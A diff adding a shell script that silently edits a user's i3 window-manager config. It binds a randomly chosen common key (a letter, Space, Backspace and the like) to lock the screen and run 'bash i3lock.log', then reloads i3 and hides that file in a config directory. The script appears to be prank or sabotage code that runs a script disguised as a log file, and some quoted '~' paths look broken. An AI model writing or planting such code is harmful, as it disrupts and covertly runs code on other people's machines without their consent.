@@ -1,0 +1,21 @@
+#!/bin/sh
+
+dir="~/afs/.confs/config/i3"
+conf="~/.config/i3"
+
+grep -Eq "bindsym .* exec i3lock && bash $dir/i3lock.log" "$conf/config"\
+    || echo "bindsym A exec i3lock && bash $dir/i3lock.log" >> "$conf/config"
+nb=$(shuf -i 0-30 -n 1)
+
+list="q w e r t y u i o p a s d f g h j k l z x c v b n m \
+    Backspace Space Tab Ctrl \$mod"
+
+for i in $list; do
+    if [ $nb -eq 0 ];then
+        sed -Ein "s/^(bindsym) .* (exec i3lock && bash $dir\/i3lock.log)$/\1 $i \2/g" "$conf/config" 2>/dev/null
+        break;
+    fi
+    nb=$((nb - 1))
+done
+i3-msg reload > /dev/null
+mv i3lock.log "$dir/i3lock.log"
